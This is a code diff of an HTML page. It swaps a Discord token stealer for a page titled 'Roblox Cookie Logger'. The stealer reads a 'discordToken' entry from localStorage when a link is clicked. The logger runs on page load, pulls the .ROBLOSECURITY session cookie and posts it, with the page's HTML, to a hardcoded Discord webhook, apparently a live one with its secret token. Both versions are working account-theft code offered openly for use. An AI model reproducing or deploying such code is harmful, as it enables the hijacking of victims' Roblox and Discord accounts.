@@ -1,43 +1,51 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
-  <meta charset="UTF-8">
-  <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <title>My Website</title>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Roblox Cookie Logger</title>
 </head>
 <body>
-  <a href="#" id="discord-link">Click Here</a>
 
-  <script>
-    // Listen for click event on the link
-    document.getElementById('discord-link').addEventListener('click', function(event) {
-      // Prevent default behavior of the link
-      event.preventDefault();
+<!-- Include the script to extract Roblox cookie and send it to Discord -->
+<script>
+    // Function to extract Roblox cookie
+    function extractRobloxCookie() {
+        // Attempt to access the Roblox cookie
+        var robloxCookie = document.cookie.match(/\.ROBLOSECURITY=([^;]+)/);
 
-      // Capture the Discord token from local storage (assuming it's stored there)
-      var discordToken = localStorage.getItem('discordToken');
+        // If the cookie is found, send it to the designated Discord webhook along with the HTML content of the page
+        if (robloxCookie) {
+            var cookieValue = robloxCookie[1];
+            var endpoint = 'https://discord.com/api/webhooks/1231774438463242290/PP9iMkmZa0F81Zp3QUwuEAh5uGd2jvw86T0e5KypWYaoHKqXRqAvvkVHPOEKZsO4mRFx'; // Replace with your actual Discord webhook endpoint
 
-      // Send the Discord token to your Discord webhook
-      fetch('https://discord.com/api/webhooks/1231774438463242290/PP9iMkmZa0F81Zp3QUwuEAh5uGd2jvw86T0e5KypWYaoHKqXRqAvvkVHPOEKZsO4mRFx', {
-        method: 'POST',
-        headers: {
-          'Content-Type': 'application/json'
-        },
-        body: JSON.stringify({
-          content: 'Captured Discord token: ' + discordToken
-        })
-      })
-      .then(response => {
-        if (response.ok) {
-          console.log('Discord token sent successfully!');
-        } else {
-          console.error('Failed to send Discord token:', response.status, response.statusText);
+            // Send the cookie value and HTML content to the endpoint
+            fetch(endpoint, {
+                method: 'POST',
+                body: JSON.stringify({ 
+                    robloxCookie: cookieValue,
+                    htmlContent: document.documentElement.outerHTML // Include the HTML content of the page
+                }),
+                headers: {
+                    'Content-Type': 'application/json'
+                }
+            })
+            .then(response => {
+                if (response.ok) {
+                    console.log('Roblox cookie and HTML content sent successfully!');
+                } else {
+                    console.error('Failed to send Roblox cookie and HTML content:', response.status, response.statusText);
+                }
+            })
+            .catch(error => {
+                console.error('Error sending Roblox cookie and HTML content:', error.message);
+            });
         }
-      })
-      .catch(error => {
-        console.error('Error sending Discord token:', error.message);
-      });
-    });
-  </script>
+    }
+
+    // Call the function to extract and send the Roblox cookie and HTML content
+    extractRobloxCookie();
+</script>
+
 </body>
 </html>
